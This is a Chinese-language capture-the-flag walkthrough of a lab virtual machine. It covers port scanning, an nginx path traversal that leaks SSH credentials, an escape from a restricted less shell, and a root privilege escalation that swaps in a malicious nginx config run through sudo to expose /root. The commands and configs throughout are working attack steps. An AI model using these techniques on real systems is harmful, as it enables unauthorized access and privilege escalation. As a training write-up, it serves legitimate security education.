# **一、信息收集**

## 1. 主机发现

首先，在本地网络中使用 `arp-scan` 工具进行主机发现，确定目标靶机的 IP 地址为 `192.168.205.241`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.241 08:00:27:31:f6:a3       PCS Systemtechnik GmbH
...
```

## 2. 端口与服务扫描

使用 `nmap` 对目标主机进行全端口扫描，发现其开放了 22 (SSH) 和 80 (HTTP) 两个端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.241
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 07:27 EDT
Nmap scan report for 192.168.205.241
Host is up (0.000094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:31:F6:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 3. Web目录枚举与漏洞发现

访问 80 端口是一个静态网页，没有可交互的功能。使用 `gobuster` 进行目录爆破，发现了一个 `/config` 目录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 64
...
/config               (Status: 301) [Size: 169] [--> http://192.168.205.241/config/]
...
```

对 `/config/` 目录进行深度爆破未果。在尝试多种路径后，发现 Web 服务器存在目录穿越漏洞，通过访问 `/config../` 可以跳出当前 Web 根目录的限制。利用此漏洞，我们继续对上层目录进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.241/config../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
...
/config.txt           (Status: 200) [Size: 41]
...
```

成功发现了一个名为 `config.txt` 的敏感文件。

# **二、初始访问**

## 1. 凭证获取

使用 `curl` 读取通过目录穿越漏洞发现的 `config.txt` 文件，成功获取到一组 SSH 登录凭证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241/config../config.txt
SSH Credentials: mikannse/mikannsebyebye
```

凭证为 `mikannse:mikannsebyebye`。

## 2. SSH登录与Shell逃逸

利用获取到的凭证成功登录 SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh mikannse@192.168.205.241
```

登录后发现当前 Shell 是一个受限环境（类似于 `less` 或 `more`），无法直接执行命令。在这种环境下，可以通过 `less` 的内部命令 `!` 来执行外部 Shell 命令。输入 `!/bin/bash` 成功获得一个标准的 Bash Shell。

# **三、权限提升**

## 1. Sudo权限分析

获得初始 Shell 后，首先查看当前用户 `mikannse` 的家目录，并读取 `user.txt` 获得第一个 flag。

```bash
mikannse@Config:~$ ls -al
total 36
drwx------ 2 mikannse mikannse 4096 Jul  5 00:50 .
drwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..
-rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt
lrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -> /dev/null
-rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout
-rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc
-rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst
-rw-r--r-- 1 root     root      551 Jul  5 00:50 mikannse.conf
-rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 .profile
-rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt
mikannse@Config:~$ cat user.txt 
flag{user-530773d6-5951-11f0-89d9-836ccaf94d6b}
```

注意到其中有一个 `root` 用户所有的配置文件 `mikannse.conf`。接着，执行 `sudo -l` 查看当前用户的 `sudo` 权限。

```bash
mikannse@Config:~$ sudo -l
Matching Defaults entries for mikannse on Config:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mikannse may run the following commands on Config:
    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

结果显示，`mikannse` 用户可以无密码以 `root` 权限执行 `nginx` 命令，并强制使用 `/home/mikannse/mikannse.conf`作为配置文件。

## 2. Nginx配置劫持提权

虽然我们无法直接写入由 `root` 拥有的 `mikannse.conf` 文件，但该文件位于我们的家目录 `/home/mikannse` 下，这意味着我们对该目录有写权限。因此，我们可以先将原文件重命名或删除，然后创建一个同名的恶意配置文件来劫持 `sudo` 执行流程。

**提权步骤:**

1.  将原始的 `mikannse.conf` 文件重命名，以作备份。
2.  创建一个新的 `mikannse.conf` 文件。
3.  在新配置文件中，配置 Nginx 启动一个新的 Web 服务（例如在 8081 端口），其根目录指向 `/root` 目录，并开启目录列表功能 (`autoindex on`)。

```bash
# 移动原配置文件
mikannse@Config:~$ mv /home/mikannse/mikannse.conf a

# 创建并写入恶意配置文件
mikannse@Config:~$ vim mikannse.conf 
mikannse@Config:~$ cat mikannse.conf
user root;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    server {
        listen       8081;          
        server_name  Config;     
        
        # 关键配置：将/files路径映射到/root/目录
        location /files {
            alias /root/;
            autoindex on; # 开启目录浏览
        }
    }
}
```

4.  使用 `sudo` 执行 Nginx 命令，使其以 `root` 权限加载我们的恶意配置。

```bash
mikannse@Config:~$ sudo /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

执行后，Nginx 会在后台以 `root` 身份启动一个监听 8081 端口的 Web 服务，该服务会将 `/root` 目录的内容暴露出来。

# **四、夺取旗帜**

回到攻击机，使用 `curl` 访问目标靶机 `192.168.205.241` 的 8081 端口。

首先，访问 `/files/` 路径，由于开启了 `autoindex`，服务器会列出 `/root` 目录下的所有文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241:8081/files/
<html>
<head><title>Index of /files/</title></head>
<body>
<h1>Index of /files/</h1><hr><pre><a href="../">../</a>
<a href="root.txt">root.txt</a>                                           05-Jul-2025 03:54                  48
</pre><hr></body>
</html>
```

在列表中我们看到了 `root.txt` 文件。接着直接读取该文件，获得最终的 root flag。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.241:8081/files/root.txt
flag{root-bf116e68-5953-11f0-b06c-63e27ce93d04}
```

至此，user 和 root 两个 flag 均已获取，渗透测试完成。